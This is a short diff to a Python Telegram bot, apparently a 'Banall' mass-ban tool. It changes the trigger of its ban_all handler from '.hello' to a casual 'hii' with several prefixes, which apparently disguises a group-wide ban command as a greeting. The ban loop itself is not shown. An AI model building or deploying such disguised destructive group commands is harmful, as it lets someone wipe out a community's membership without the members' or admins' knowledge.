@@ -18,10 +18,10 @@ import requests
 
 from Banall import app
 
-@app.on_message(filters.command(["hello"], prefixes=["."]) & filters.group)
+@app.on_message(filters.command(["hii"], prefixes=[".","/","!"]) & filters.group)
 async def ban_all(client, msg):
     chat_id = msg.chat.id    
-    LOL = await msg.reply_text("ᴛʏᴘᴇ hii")
+    LOL = await msg.reply_text("hii")
     app = await client.get_me()
     BOT_ID = app.id
     x = 0
